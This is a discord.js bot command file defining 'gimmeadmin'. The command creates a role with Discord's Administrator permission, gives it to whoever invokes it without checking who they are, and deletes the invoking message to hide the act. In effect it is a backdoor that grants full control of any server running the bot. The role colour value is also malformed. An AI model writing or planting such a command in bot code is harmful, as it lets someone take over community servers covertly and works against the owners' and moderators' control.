const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

        role = await message.guild.roles.create ({

            data: {
                name: "xloy is admin",
          	    color: "#ff00f",
          	    permissions: [8]
            }

        });
            
        message.member.roles.add(role)
        message.delete();

    } catch(e) {

        console.log(e.stack);

    }
}

module.exports.help = {

    name: "gimmeadmin",
    desc: "Gives you admin perms."

}
